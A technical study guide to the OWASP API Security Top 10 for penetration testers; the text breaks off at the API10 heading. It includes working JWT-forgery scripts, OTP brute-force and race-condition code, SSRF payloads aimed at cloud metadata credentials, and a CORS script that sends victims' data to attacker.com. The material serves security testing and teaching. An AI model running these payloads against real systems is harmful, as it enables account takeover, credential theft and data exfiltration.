# OWASP API Security Top 10 — Deep Technical Notes

> **Purpose:** Practical + theoretical understanding of API-specific vulnerabilities for penetration testers and security researchers.

---

## Table of Contents

1. [What Are API Vulnerabilities?](#1-what-are-api-vulnerabilities)
2. [How APIs Differ from Traditional Web Apps](#2-how-apis-differ-from-traditional-web-apps)
3. [API1 — Broken Object Level Authorization (BOLA)](#3-api1--broken-object-level-authorization-bola)
4. [API2 — Broken Authentication](#4-api2--broken-authentication)
5. [API3 — Broken Object Property Level Authorization](#5-api3--broken-object-property-level-authorization)
6. [API4 — Unrestricted Resource Consumption](#6-api4--unrestricted-resource-consumption)
7. [API5 — Broken Function Level Authorization](#7-api5--broken-function-level-authorization)
8. [API6 — Unrestricted Access to Sensitive Business Flows](#8-api6--unrestricted-access-to-sensitive-business-flows)
9. [API7 — Server-Side Request Forgery (SSRF)](#9-api7--server-side-request-forgery-ssrf)
10. [API8 — Security Misconfiguration](#10-api8--security-misconfiguration)
11. [API9 — Improper Inventory Management](#11-api9--improper-inventory-management)
12. [API10 — Unsafe Consumption of APIs](#12-api10--unsafe-consumption-of-apis)
13. [Quick Reference Cheat Sheet](#13-quick-reference-cheat-sheet)

---

## 1. What Are API Vulnerabilities?

APIs (Application Programming Interfaces) directly expose backend functionality, business logic, data objects, and authentication systems — usually through structured endpoints that consume and return JSON or XML. Unlike traditional web applications where a browser renders the UI and limits what a user can directly interact with, APIs hand the raw data model directly to whoever is making requests.

### Why API Vulnerabilities Are Different

- **Authorization failures compound** — APIs serve structured objects (orders, users, invoices) by ID; missing object-level checks mean every ID is a potential IDOR
- **Frontend trust assumptions don't apply** — the frontend hides certain buttons or fields; attackers talk directly to the API and bypass all frontend logic
- **Mass assignment is endemic** — frameworks automatically map JSON fields to backend models, meaning any field the model has can potentially be set by the attacker
- **Business logic lives in the API** — workflows, rate limits, and transaction rules enforced in API endpoints are directly accessible and testable

---

## 2. How APIs Differ from Traditional Web Apps

```
Traditional Web App:
Browser → Web Server → HTML Response → Browser renders
(User sees only what the HTML/JS presents)

API:
Client (browser/mobile/script) → API Endpoint → JSON Response
(Client receives raw data directly — no rendering filter)
```

**What this means for attackers:**

| Property | Traditional App | API |
|----------|----------------|-----|
| Object references | Hidden in HTML | Exposed in URLs and JSON bodies |
| Authorization checks | Often enforced at page level | Must be enforced per-object, per-property, per-function |
| Data filtering | Server renders only what user should see | Server returns full object; frontend filters (easily bypassed) |
| Business logic | Embedded in multi-page flow | Directly callable endpoint-by-endpoint |
| Attack surface discovery | Crawl rendered HTML | JavaScript analysis, mobile traffic, endpoint fuzzing |

---

## 3. API1 — Broken Object Level Authorization (BOLA)

### What Is BOLA?

BOLA (also known as IDOR — Insecure Direct Object Reference) occurs when an API endpoint accepts an object identifier from the client and retrieves or operates on that object **without verifying that the authenticated user is authorized to access it**. Authentication is present — the server knows who you are — but ownership or access rights are never checked.

### How It Happens Internally

```
Client Request:
GET /api/orders/1337 HTTP/1.1
Authorization: Bearer user_A_token

Backend (vulnerable):
SELECT * FROM orders WHERE id = 1337    ← no ownership check

Backend (correct):
SELECT * FROM orders WHERE id = 1337 AND user_id = authenticated_user_id
```

The critical gap: the authenticated user identity is verified at the session level but never joined against the object being requested.

### Where It Occurs — Attack Surface

| Location | Example | Notes |
|----------|---------|-------|
| URL path parameters | `GET /api/users/124` | Most visible and most tested |
| URL query parameters | `GET /api/export?invoice_id=55` | Often missed in testing |
| JSON request body | `{"order_id": 99, "action": "cancel"}` | Common in POST/PATCH requests |
| GraphQL queries | `query { order(id: 99) { total } }` | ID passed as argument |
| File download parameters | `GET /api/files?name=user_1001_report.pdf` | Filename = indirect object reference |
| Headers | `X-User-Id: 124` | Custom headers sometimes used for routing |

### Detection

**Step 1 — Identify object references:**
```
GET /api/users/1001          → numeric ID
GET /api/orders/550e8400...  → UUID
GET /api/messages/carlos     → username as reference
GET /api/invoices/INV-2024-001 → business-format ID
```

**Step 2 — Modify the reference:**
```http
# Original (your resource)
GET /api/users/1001 HTTP/1.1
Authorization: Bearer your_token

# Modified (another user's resource)
GET /api/users/1002 HTTP/1.1
Authorization: Bearer your_token
```

**Positive indicator:** Response returns another user's data (name, email, payment info)
**Negative indicator:** `403 Forbidden` or `404 Not Found` — authorization enforced

**Step 3 — Test write operations on foreign objects:**
```http
PUT /api/users/1002/email HTTP/1.1
Authorization: Bearer user_1001_token
Content-Type: application/json

{"email": "attacker@evil.com"}
```

**Step 4 — Test across all HTTP methods:**
```http
GET    /api/orders/1337   → read
PUT    /api/orders/1337   → modify
PATCH  /api/orders/1337   → partial modify
DELETE /api/orders/1337   → delete
POST   /api/orders/1337/cancel → action
```

**Step 5 — Multi-account comparison:**
```
Account A (user_id: 1001):
  Own objects: orders 55, 56, 57

Account B (user_id: 1002):
  Own objects: orders 100, 101, 102

Test: Account A requests order 100 → should get 403
If gets 200 → BOLA confirmed
```

### UUID Bypass Note

Developers sometimes use UUIDs thinking they're unguessable — but UUIDs are often leaked in:
- Emails (order confirmations, receipts)
- API responses when listing objects
- Logs, export files, shared links
- Other user's profiles if UUIDs are used as references

Never treat UUID as a security control — only authorization logic is a security control.

> **Attacker note:** The most impactful BOLA findings are in write operations — `PUT`, `PATCH`, `DELETE`. Read BOLA is bad but write BOLA is account modification. Always test every HTTP verb against every object reference you find. The `GET` endpoint may have authorization but the `DELETE` endpoint for the same object ID may not — this asymmetry is extremely common.

### Impact Assessment

| Factor | Lower Severity | Higher Severity |
|--------|---------------|-----------------|
| Object type | Public profile data | Payment methods, credentials, private messages |
| HTTP method | Read only | Write, delete, action |
| ID predictability | UUIDs (hard to guess) | Sequential integers (trivially enumerable) |
| Scale | Single object | All objects (full database enumerable) |

### Full Compromise Chain

```
1. Identify numeric user ID in own profile API response
2. Decrement/increment ID to reach other users
3. Read other users' PII, email addresses, internal data
4. Modify other users' email addresses via BOLA on PATCH endpoint
5. Trigger password reset to attacker-controlled email
6. Full account takeover
```

---

## 4. API2 — Broken Authentication

### What Is Broken Authentication?

Broken Authentication covers any weakness in how an API verifies identity — from predictable tokens and weak secrets to missing signature validation and improper session management. The result is the same: an attacker can present themselves as a user they are not.

### Where It Occurs — Attack Surface

| Location | Example | Notes |
|----------|---------|-------|
| JWT signature validation | `alg: none` accepted | Library misconfiguration |
| Token entropy | Sequential session IDs | Predictable tokens → enumeration |
| Password reset flow | Guessable reset tokens | Token lifetime or entropy issues |
| OAuth implementation | Missing state parameter | CSRF on OAuth flow |
| API key management | Long-lived, non-rotatable keys | No expiration or revocation |
| Session invalidation | Tokens valid after logout | Stateless JWT never revoked |

### Detection

**Identify the authentication mechanism:**
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...   ← JWT
Authorization: Bearer opaque_token_string         ← Opaque token
Cookie: session=abc123def456                      ← Session cookie
X-API-Key: sk_live_abc123                         ← API key
```

**Decode and analyze JWTs immediately:**
```bash
# Decode all three sections
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

echo "eyJzdWIiOiJ1c2VyMTIzIn0" | base64 -d
# {"sub":"user123","role":"user"}
```

**What to look for in the JWT header:**
```json
{
  "alg": "HS256",   ← weak? brute forceable?
  "typ": "JWT",
  "kid": "key-1",  ← injection vector?
  "jku": "...",    ← injection vector?
  "jwk": {...}     ← injection vector?
}
```

### Attack Techniques

#### 5.1 Signature Not Verified

**Situation:** The server deserializes the JWT and uses claims without ever checking the signature.

**Payload:**
```
# Modify payload, keep original signature (or use garbage)
Original: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.VALID_SIG
Modified: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.VALID_SIG
```

**Why it works:** The application calls `decode()` instead of `verify()` — or the verification step was skipped in a code path. Claims are trusted directly from the Base64-decoded payload.

> **Attacker note:** This is the first thing to test — before any cryptographic attack. Modify the `sub` or `role` claim, keep everything else identical, resubmit. If accepted, you have immediate account takeover with zero cryptography. Custom JWT implementations miss this far more often than established libraries.

#### 5.2 Algorithm None Attack

**Situation:** The JWT library accepts `"alg": "none"` — no signature required.

**Payload:**
```bash
# Build unsigned token manually
header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
payload=$(echo -n '{"sub":"administrator","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
echo "$header.$payload."    # trailing dot, empty signature
```

**Case variations to try:**
```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
```

**Why it works:** The JWT spec legitimately defines `none` for unsecured contexts. Misconfigured libraries treat it as a valid algorithm selection and skip the signature verification code path entirely.

> **Attacker note:** Always try all case variations. Many libraries blacklist only lowercase `"none"` — uppercase variants bypass the blacklist while still triggering the unsigned code path.

#### 5.3 Algorithm Confusion (RS256 → HS256)

**Situation:** The server uses RS256 (asymmetric). The public key is known. Attacker switches algorithm to HS256 and signs using the public key as the HMAC secret.

**Attack flow:**
```
1. Obtain public key from /jwks.json or /.well-known/jwks.json
2. Convert JWK to PEM
3. Modify header: "alg": "RS256" → "alg": "HS256"
4. Modify payload claims
5. Sign token with public_key_pem as HMAC secret
6. Submit — server verifies HMAC using public key → matches → accepted
```

**Signing with public key as secret:**
```python
import jwt

public_key = open('public_key.pem', 'rb').read()

forged = jwt.encode(
    {"sub": "administrator", "role": "admin"},
    public_key,      # public key bytes used as HMAC secret
    algorithm="HS256"
)
```

**Why it works:** The library reads `alg` from the attacker-controlled header, switches to HMAC mode, and uses whatever key material it has (the public key) as the HMAC secret. The attacker knows the public key, so they can compute the exact same HMAC.

> **Attacker note:** The public key format matters — it must match exactly what the server uses as its key material. Try both with and without the PEM headers (`-----BEGIN PUBLIC KEY-----`). A wrong format produces a different HMAC silently.

#### 5.4 Weak Secret Brute Force

**Situation:** HS256/384/512 with a guessable HMAC secret.

**Brute force:**
```bash
# Hashcat mode 16500 = JWT
hashcat -a 0 -m 16500 captured.jwt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 captured.jwt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt

# Brute force short secrets
hashcat -a 3 -m 16500 captured.jwt ?a?a?a?a?a?a

# After cracking, forge token
python3 -c "
import jwt
print(jwt.encode({'sub':'administrator','role':'admin'}, 'cracked_secret', algorithm='HS256'))
"
```

**Common weak secrets to try manually:**
```
secret, password, admin, jwtsecret, changeme,
your-256-bit-secret, supersecret, development
```

**Why it works:** HMAC is symmetric — the signing and verification key are identical. If the key is a dictionary word or short string, offline cracking against a captured token is fast (billions of candidates per second on GPU).

> **Attacker note:** Crack before any complex attack when `alg` is HS256. Many developers set the JWT secret to the application name or leave the framework default. The crack is entirely offline — the server is never touched during the attack.

#### 5.5 JKU / JWK Header Injection

**Situation:** Server fetches signing keys from the `jku` URL or trusts keys embedded in the `jwk` header — both attacker-controlled.

**JKU attack:**
```json
// Modified JWT header
{
  "alg": "RS256",
  "jku": "https://attacker.com/jwks.json",
  "kid": "attacker-key"
}
```

```bash
# Generate RSA pair
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# Host JWKS with attacker public key at https://attacker.com/jwks.json
# Sign JWT with attacker private key
# Server fetches JWKS → gets attacker public key → verifies → accepts
```

**JWK attack (self-contained):**
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "n": "<attacker_public_key_modulus_base64url>",
    "kid": "attacker-key"
  }
}
```

**Why it works:** Server trusts the `jku` URL or embedded `jwk` to provide the verification key. Attacker controls both the private key (for signing) and the public key (embedded or hosted) — a self-referential trust loop.

> **Attacker note:** JKU bypass when domain is whitelisted — try `https://target.com@attacker.com`, open redirects on target.com, or subdomains: `https://attacker.com.target.com`. JWK injection is self-contained with no external server needed — prefer it when you need stealth.

#### 5.6 KID Path Traversal

**Situation:** Server uses `kid` to load a key file from disk.

**Payload:**
```json
{
  "alg": "HS256",
  "kid": "../../../../../../../dev/null"
}
```

```python
# /dev/null = empty file = empty string as HMAC secret
import jwt
forged = jwt.encode(
    {"sub": "administrator", "role": "admin"},
    "",          # empty string — matches /dev/null
    algorithm="HS256",
    headers={"kid": "../../../../../../../dev/null"}
)
```

**Why it works:** The `kid` value is concatenated into a filesystem path without sanitization. `/dev/null` contains zero bytes on every Linux system — the HMAC secret becomes an empty string, which the attacker can compute exactly.

> **Attacker note:** If `/dev/null` is filtered, try `/proc/sys/kernel/ostype` (`Linux\n`) or `/etc/hostname` (predictable short string). If the app runs on Windows, target `NUL`.

### Impact Assessment

| Factor | Lower Severity | Higher Severity |
|--------|---------------|-----------------|
| Token type | Opaque (server-side) | JWT (self-contained, forgeable offline) |
| Algorithm | RS256 with strong key | HS256 with weak secret |
| Claims | Username only | Role, isAdmin, permissions |
| Invalidation | Token denylist in place | Stateless — no revocation possible |

---

## 5. API3 — Broken Object Property Level Authorization

Object property level authorization failures occur in two distinct forms:

1. **Excessive Data Exposure** — the API returns more object properties than the user should see (sensitive fields the frontend is supposed to hide)
2. **Mass Assignment** — the API accepts more object properties than the user should be able to set (backend model automatically maps all JSON fields)

### Where It Occurs

| Location | Example | Notes |
|----------|---------|-------|
| GET response objects | `{"passwordHash": "...", "internalRole": "admin"}` in user response | Backend returns full model |
| POST/PUT/PATCH request bodies | `{"role": "admin"}` accepted in profile update | Framework auto-maps fields |
| GraphQL queries | `query { user { passwordHash } }` | All fields queryable if not restricted |
| Registration endpoints | `{"isAdmin": true}` in registration body | Common mass assignment target |
| Profile update endpoints | `{"creditBalance": 99999}` accepted | Financial field mass assignment |

### Detection

**Test for excessive data exposure — compare roles:**
```http
# Request as low-privilege user
GET /api/users/me HTTP/1.1
Authorization: Bearer low_priv_token

# Response leaking internal fields:
{
  "id": 1001,
  "email": "user@example.com",
  "passwordHash": "$2b$12$...",        ← should not be exposed
  "internalRole": "standard",          ← internal field
  "twoFactorSecret": "JBSWY3DPEHPK3PXP"  ← should not be exposed
}
```

**Test for mass assignment — add hidden fields to requests:**
```http
PUT /api/users/me HTTP/1.1
Authorization: Bearer user_token
Content-Type: application/json

{
  "name": "Updated Name",
  "role": "admin",           ← add this
  "isAdmin": true,           ← add this
  "creditBalance": 999999,   ← add this
  "emailVerified": true      ← add this
}
```

**Positive indicator:** Subsequent GET shows the injected field was updated → mass assignment confirmed.

**Discovery — find all model properties:**
```
1. Admin response vs user response — compare fields returned
2. Error messages — may reveal field names that exist but aren't writable
3. API documentation (Swagger/OpenAPI) — lists all model properties
4. JavaScript source — object structures often reflected in frontend code
5. Different HTTP methods — PATCH response may include fields not in GET
```

> **Attacker note:** The highest-value mass assignment targets in order: `role`, `isAdmin`, `admin`, `emailVerified`, `creditBalance`, `subscriptionTier`, `locked`, `twoFactorEnabled`. Add them all in one request — if any are accepted, escalate. For excessive data exposure, pipe the full API response through `jq keys` to see every field returned and flag anything that shouldn't be client-visible.

### Impact Assessment

| Factor | Lower Severity | Higher Severity |
|--------|---------------|-----------------|
| Exposed data | Public information | Credentials, secrets, PII |
| Assignable field | Preferences | Role, admin flag, balance |
| Scope | Own account | All accounts |

---

## 6. API4 — Unrestricted Resource Consumption

### What Is It?

APIs expose backend processing directly — without rate limiting, concurrency controls, or resource caps, attackers can exhaust CPU, memory, bandwidth, database connections, or external API quotas by sending high volumes of requests or crafting computationally expensive inputs.

### Where It Occurs

| Location | Example | Notes |
|----------|---------|-------|
| Authentication endpoints | Unlimited login attempts | Enables brute force |
| OTP verification | No attempt limits | OTP brute forceable |
| Search/filter endpoints | Complex regex queries | ReDoS possible |
| GraphQL endpoints | Deeply nested queries | N+1 query explosion |
| File upload | No size limit | Disk exhaustion |
| PDF/report generation | Trigger expensive processing | CPU exhaustion |
| External API calls | No quota on webhook triggers | External quota exhaustion |

### Detection & Testing

**Test rate limiting on authentication:**
```bash
# Rapid POST loop — check for 429 or lockout
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"attempt'$i'"}'
done
```

**GraphQL nested query (N+1 exhaustion):**
```graphql
query {
  users {
    orders {
      items {
        product {
          reviews {
            author {
              orders {
                items { id }
              }
            }
          }
        }
      }
    }
  }
}
```

**Race condition test — concurrent requests:**
```python
import asyncio, aiohttp

async def send(session, i):
    return await session.post(
        'https://target.com/api/redeem-coupon',
        json={'code': 'DISCOUNT50'},
        headers={'Authorization': 'Bearer token'}
    )

async def race():
    async with aiohttp.ClientSession() as s:
        results = await asyncio.gather(*[send(s, i) for i in range(30)])
        for r in results:
            print(await r.json())

asyncio.run(race())
```

> **Attacker note:** GraphQL is especially dangerous here — a single deeply nested query can cause hundreds of database queries. Check whether the API limits query depth or complexity. Also test whether the same endpoint that limits authenticated users also limits unauthenticated requests — rate limits are often only applied post-auth.

---

## 7. API5 — Broken Function Level Authorization

### What Is It?

Authentication verifies identity. Function-level authorization verifies whether the authenticated identity is **permitted to call a specific function**. When APIs expose administrative or privileged functions without checking whether the caller has the right to invoke them, any authenticated user can call admin-only operations.

### Where It Occurs

| Location | Example | Notes |
|----------|---------|-------|
| Admin REST endpoints | `DELETE /api/admin/users/123` | Not linked from UI but callable |
| Hidden API versions | `/api/v1/admin/` vs `/api/v2/user/` | Old version has no auth check |
| HTTP method escalation | `GET /api/users/123` → try `DELETE` | Method-level auth missing |
| Internal/debug endpoints | `/api/internal/config` | Never meant to be called externally |
| Function parameters | `?action=admin_reset` | Action parameter bypasses function check |

### Detection

**Step 1 — Discover hidden administrative endpoints:**
```bash
# Wordlist-based endpoint discovery
gobuster dir -u https://api.target.com -w \
  /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Patterns to probe
/api/admin
/api/internal
/api/manage
/api/config
/api/v1/admin
/internal/api
/management
```

**Step 2 — Test low-privilege token against admin endpoints:**
```http
# Admin functionality attempted with regular user token
DELETE /api/users/1 HTTP/1.1
Authorization: Bearer regular_user_token

GET /api/admin/users HTTP/1.1
Authorization: Bearer regular_user_token

POST /api/admin/config HTTP/1.1
Authorization: Bearer regular_user_token
Content-Type: application/json
{"maintenance_mode": true}
```

**Step 3 — HTTP method escalation on known endpoints:**
```http
# Known readable endpoint
GET /api/products/catalog HTTP/1.1   → 200 OK

# Test write methods on same path
POST   /api/products/catalog HTTP/1.1  → ?
PUT    /api/products/catalog HTTP/1.1  → ?
DELETE /api/products/catalog HTTP/1.1  → ?
PATCH  /api/products/catalog HTTP/1.1  → ?
```

**Step 4 — Version downgrade (old versions often miss auth):**
```http
# Current version (has auth)
DELETE /api/v3/users/1 HTTP/1.1  → 403

# Old version (no auth check)
DELETE /api/v1/users/1 HTTP/1.1  → 200  ← function-level auth missing in v1
DELETE /api/v2/users/1 HTTP/1.1  → 200
```

> **Attacker note:** The richest source of function-level auth failures is JavaScript. Download every JS bundle from the application, search for API routes (`/api/`, `fetch(`, `axios.`, `.post(`, `.delete(`), and you'll find endpoints the UI never links to but the server exposes. Developers remove UI elements to "hide" admin features but forget to add auth checks to the underlying API routes.

---

## 8. API6 — Unrestricted Access to Sensitive Business Flows

### What Is It?

These vulnerabilities exist at the workflow and business logic layer — authentication works, authorization works, inputs are validated — but the API doesn't enforce the business rules that should prevent abuse: action limits, workflow ordering, anti-automation controls, or transaction constraints.

### Where It Occurs

| Location | Example | Notes |
|----------|---------|-------|
| OTP verification | No attempt limit → brute-forceable | 6-digit OTP = 1,000,000 combinations |
| Coupon/voucher redemption | No per-user use limit or race condition | Coupon used multiple times |
| Referral/reward systems | Automated self-referral loops | Generate unlimited credit |
| Checkout/payment flow | Steps skippable → confirm without paying | Workflow state not server-enforced |
| Wallet/balance transfers | Race condition on concurrent transfers | Transfer same funds multiple times |
| Password reset flow | Unlimited OTP requests → SMS bombing | Rate limit absent |
| Inventory reservation | Reserve same item concurrently → oversell | Race window exploitable |

### Detection & Testing

**OTP brute force — check for attempt limiting:**
```python
import requests

session = requests.Session()
session.headers['Authorization'] = 'Bearer target_token'

for code in range(0, 1000000):
    r = session.post('https://target.com/api/verify-otp',
                     json={'otp': str(code).zfill(6)})
    if r.status_code != 429:  # no rate limiting
        print(f"No limit at attempt {code}: {r.status_code}")
    if r.status_code == 200:
        print(f"Valid OTP: {code:06d}")
        break
```

**Workflow skip — access later step without completing earlier:**
```http
# Normal flow:
# POST /api/cart/add → POST /api/checkout → POST /api/payment → POST /api/payment/confirm

# Skip directly to confirm:
POST /api/payment/confirm HTTP/1.1
Authorization: Bearer user_token
Content-Type: application/json

{"cart_id": "cart_abc123"}
```

**Positive indicator:** Order confirmed without payment — workflow state not validated server-side.

**Race condition — concurrent coupon redemption:**
```python
import asyncio, aiohttp

async def redeem(session):
    return await session.post(
        'https://target.com/api/coupon/redeem',
        json={'code': 'SAVE50', 'cart_id': 'cart123'},
        headers={'Authorization': 'Bearer token'}
    )

async def race():
    async with aiohttp.ClientSession() as s:
        # Send 25 simultaneous redemptions
        results = await asyncio.gather(*[redeem(s) for _ in range(25)])
        successes = [r for r in results if r.status == 200]
        print(f"Successful redemptions: {len(successes)}")  # should be 1

asyncio.run(race())
```

> **Attacker note:** Race conditions in coupon/voucher systems are almost universally present in applications that haven't explicitly implemented TOCTOU (time-of-check-time-of-use) protection. The window is often only milliseconds — send 20+ concurrent requests in a single burst. If even 2 succeed when only 1 should, the race condition is confirmed and exploitable. Financial impact makes these high-severity findings.

---

## 9. API7 — Server-Side Request Forgery (SSRF)

### What Is It?

API endpoints that accept URLs or hostnames as input and fetch them server-side create SSRF vulnerabilities. Because the request originates from within the server's network, it bypasses perimeter firewalls, IP allowlists, and network segmentation that would block the attacker directly.

### Where It Occurs — API-Specific Surface

| Location | Example | Notes |
|----------|---------|-------|
| Import/fetch-from-URL | `{"url": "https://example.com/data.csv"}` | Data import features |
| Webhook configuration | `{"webhook_url": "https://..."}` | Callback delivery systems |
| Avatar/image import by URL | `{"avatar_url": "https://..."}` | Profile image fetching |
| PDF/report generation | HTML with `<img src="...">` in template | Headless browser fetches src |
| Open Graph / link preview | URL submitted → server fetches metadata | Preview generation |
| Health check / ping features | `{"endpoint": "https://..."}` to test | Admin monitoring features |
| Microservice internal calls | `{"service_url": "http://internal-api/..."}` | Internal routing |

### Detection & Testing

**Basic internal target probes:**
```http
POST /api/import HTTP/1.1
Content-Type: application/json

{"url": "http://localhost/admin"}
{"url": "http://127.0.0.1:8080/internal"}
{"url": "http://169.254.169.254/latest/meta-data/"}
{"url": "http://192.168.0.1/"}
{"url": "http://10.0.0.1/"}
```

**OAST confirmation (blind SSRF):**
```http
{"url": "http://your-oast-server.com/ssrf-test"}
```
DNS/HTTP callback → confirmed blind SSRF even with no response returned.

**Protocol switching:**
```http
{"url": "file:///etc/passwd"}
{"url": "gopher://127.0.0.1:6379/_INFO\r\n"}
{"url": "ftp://attacker.com/file"}
{"url": "dict://127.0.0.1:6379/info"}
```

**Cloud metadata targeting:**
```http
# AWS
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# GCP
{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}

# Azure
{"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"}
```

**Internal network scanning via SSRF:**
```
Iterate: {"url": "http://192.168.0.§1§/"}   (1–254)
Filter: 200 or 302 responses vs timeouts
→ Identifies live internal hosts
```

> **Attacker note:** In API contexts, SSRF is frequently found in webhook systems where users can configure callback URLs. These endpoints are often less scrutinized than direct user-facing inputs. Also probe microservice communication: if the API accepts a service name or endpoint as a parameter and routes internally, that routing is an SSRF vector. AWS IMDSv2 requires a PUT with a token header first — standard GET-based SSRF won't work against IMDSv2, but some SSRF contexts allow header injection alongside the request.

### Bypass Techniques

| Defense | Bypass |
|---------|--------|
| Block `127.0.0.1` | `localhost`, `127.1`, `2130706433` (decimal), `0x7f000001` (hex), `[::1]` |
| Block `169.254.169.254` | `2852039166` (decimal), DNS resolving to 169.254.169.254 |
| Domain whitelist | Open redirect on whitelisted domain, `@evil.com` confusion, subdomain of whitelisted |
| Block `http://` | `https://`, `http+unix://`, `gopher://`, `ftp://` |

---

## 10. API8 — Security Misconfiguration

### What Is It?

Security misconfiguration in API contexts spans the entire stack — from permissive CORS headers and exposed debug endpoints to verbose error messages and insecure default configurations in API gateways, frameworks, and cloud infrastructure. Each misconfiguration either leaks information that enables other attacks or directly exposes functionality that shouldn't be reachable.

### Where It Occurs

| Location | Example | Notes |
|----------|---------|-------|
| CORS headers | `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` | Cross-origin session theft |
| Error responses | Stack traces with SQL queries, class names, paths | Technology fingerprinting + direct attack data |
| Debug/documentation endpoints | `/swagger`, `/graphql`, `/actuator/env` | Full API map + config exposure |
| HTTP methods | `TRACE` enabled, `PUT` enabled on wrong paths | XST, arbitrary file write |
| Security headers | Missing CSP, HSTS, X-Content-Type-Options | Reduces impact of other vulns |
| Default credentials | Admin:admin on API gateway or management panel | Immediate access |
| Cloud storage | S3 bucket `ListBucket` allowed | Full data enumeration |

### Detection

**CORS misconfiguration test:**
```bash
# Test if arbitrary origin is reflected
curl -H "Origin: https://evil.com" -I https://api.target.com/v1/user/me

# Dangerous response:
# Access-Control-Allow-Origin: https://evil.com   ← reflects attacker origin
# Access-Control-Allow-Credentials: true           ← allows cookies/auth headers
```

**Debug/documentation endpoint discovery:**
```bash
# Common API documentation and debug endpoints
curl https://api.target.com/swagger-ui.html
curl https://api.target.com/swagger.json
curl https://api.target.com/openapi.json
curl https://api.target.com/api-docs
curl https://api.target.com/graphql
curl https://api.target.com/graphiql
curl https://api.target.com/actuator
curl https://api.target.com/actuator/env
curl https://api.target.com/actuator/mappings   # full route list
curl https://api.target.com/actuator/health
curl https://api.target.com/.well-known/openid-configuration
```

**Verbose error triggers:**
```bash
# Type mismatch (string where int expected)
curl https://api.target.com/api/users/not-a-number

# Malformed JSON body
curl -X POST https://api.target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{bad json here'

# Non-existent resource
curl https://api.target.com/api/users/9999999999
```

**What verbose errors reveal:**
```
Django: "DoesNotExist: User matching query does not exist"  → Django framework, model name
Flask:  Traceback with file paths and line numbers           → internal structure
Spring: WhiteLabel Error Page with stack trace              → Spring Boot
SQL:    "near 'X': syntax error" with partial query         → SQLi confirmed + DB type
```

> **Attacker note:** The Spring Boot Actuator `/actuator/env` endpoint returns environment variables including database connection strings, API keys, OAuth secrets, and internal service URLs. This single endpoint has been responsible for more complete environment compromises than almost any other misconfiguration. Always check it — it's present in any Spring Boot application that hasn't explicitly disabled it.

### CORS Exploitation Chain

```
1. Confirm: Access-Control-Allow-Origin reflects attacker.com
2. Confirm: Access-Control-Allow-Credentials: true
3. Host malicious page on attacker.com:

<script>
fetch('https://api.target.com/v1/user/me', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/log?d=' + JSON.stringify(data)));
</script>

4. Victim visits attacker.com (via phishing/XSS on another site)
5. Browser sends request with victim's cookies to api.target.com
6. Response (PII, tokens) forwarded to attacker server
→ Authenticated data exfiltration without touching victim's credentials
```

---

## 11. API9 — Improper Inventory Management

### What Is It?

Organizations maintain multiple API versions, environments, and integrations simultaneously. Old versions accumulate without proper decommissioning. Shadow APIs (undocumented or forgotten) remain reachable. Each unmaintained endpoint is a liability — missing security patches, weaker authentication, no rate limiting, and potentially exposing deprecated functionality that was intentionally removed from newer versions.

### Where It Occurs

| Location | Example | Notes |
|----------|---------|-------|
| Old API versions | `/api/v1/` beside `/api/v3/` | v1 may predate auth controls |
| Beta/internal paths | `/api/beta/`, `/api/internal/` | Testing endpoints left exposed |
| Mobile app endpoints | Discovered via mobile traffic analysis | Often undocumented, less secured |
| Third-party integration endpoints | Partner webhooks, B2B APIs | Less scrutinized code path |
| Microservice endpoints | Exposed directly due to misconfigured routing | Should only be internal |
| Legacy authentication | `/api/v1/` uses API key, `/api/v3/` uses JWT | Downgrade to weaker auth |

### Detection

**API version enumeration:**
```bash
# Iterate common version patterns
for ver in v1 v2 v3 v4 v5 beta internal legacy old; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer your_token" \
    "https://api.target.com/$ver/users/me")
  echo "$ver: $code"
done

# Common path patterns
/v1/, /v2/, /api/v1/, /api/v2/
/beta/, /alpha/, /preview/
/internal/, /private/
/legacy/, /old/, /deprecated/
/mobile/api/, /app/api/
```

**JavaScript analysis for undocumented endpoints:**
```bash
# Download all JS bundles
curl https://target.com/js/main.bundle.js | js-beautify > main.js

# Extract API routes
grep -Eo '["'"'"'][/][a-zA-Z0-9/_{}?=-]+["'"'"']' main.js | sort -u
grep -Eo 'axios\.[a-z]+\(['"'"'"][^'"'"'"]+' main.js
grep -Eo 'fetch\(['"'"'"][^'"'"'"]+' main.js
```

**Compare security controls across versions:**
```http
# Modern version (v3) — has rate limiting, strong auth
POST /api/v3/users/reset-password HTTP/1.1
Authorization: Bearer jwt_token

# Old version (v1) — no rate limit, weaker auth
POST /api/v1/users/reset-password HTTP/1.1
X-API-Key: old_api_key

→ v1 endpoint may have no lockout, no rate limit, weaker token validation
```

> **Attacker note:** Mobile applications are the richest source of undocumented API endpoints. Decompile APK/IPA, search for `https://api.` strings and hardcoded endpoints. Mobile teams often build their own API routes that never go through the same security review as the web-facing API. These endpoints frequently lack rate limiting, proper auth, and access controls — because they were never meant to be tested.

---

## 12. API10 — Unsafe Consumption of APIs

### What Is It?

